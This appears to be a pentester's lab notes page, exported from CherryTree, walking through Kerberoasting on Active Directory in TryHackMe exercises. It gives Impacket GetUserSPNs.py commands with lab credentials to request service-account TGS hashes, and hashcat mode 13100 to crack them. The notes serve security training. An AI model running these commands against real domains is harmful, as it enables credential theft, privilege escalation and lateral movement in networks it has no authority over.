<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>GetUserSPNs</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>GetUserSPNs</h1><br/><p><strong><h1>GetUserSPNs</h1></strong></p><p></p><p><strong>Kerberoasting with Impacket </strong></p><p></p><p><em>We will get the hash of service accounts</em></p><p></p><p>1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located</p><p>2.) <em><strong>sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.172.59 -request</strong></em> - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.</p><p></p><p>	<strong>impacket-GetUserSPNs CONTROLLER.local/Administrator:&#39;P@$$W0rd&#39; -dc-ip 10.10.172.59 -request</strong></p><p></p><p></p><p>3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash</p><p>Once the hash is cracked we get the password.</p><p></p><p></p><p><strong><h3>Another Example of Kerberoasting with Impacket</h3></strong></p><p><strong><h3></h3></strong></p><p>Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS). This attack&#39;s end goal is to enable privilege escalation and lateral network movement. For more details about the attack, you can visit the THM Persisting AD room (Task 3).</p><p></p><p>Let&#39;s do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the <strong>GetUserSPNs.py</strong> python script. Remember to use the THM.red/thm account with Passw0rd! as a password.</p><p></p><p><span style="text-decoration:underline;">Command</span>:</p><p><strong>GetUserSPNs.py -dc-ip 10.10.209.28 THM.red/thm</strong></p><p></p><p><img src="images/157-1.png" alt="images/157-1.png" /></p><p></p><p>The previous command is straightforward: we provide the Domain Controller IP address and the domain name\username. Then the GetUserSPNs script asks for the user&#39;s password to retrieve the required information.</p><p></p><p>The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the <strong>-request-user</strong> argument.</p><p></p><p>Note: we can also we <strong>-request</strong> argument only to request TGS ticket for all SPN users.</p><p></p><p><span style="text-decoration:underline;">Command</span>:</p><p><strong>GetUserSPNs.py -dc-ip 10.10.209.28 THM.red/thm -request-user svc-thm</strong></p><p></p><p><img src="images/157-2.png" alt="images/157-2.png" /></p><p></p><p>Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using <strong>-m 13100</strong></p></div>
</body>
</html>
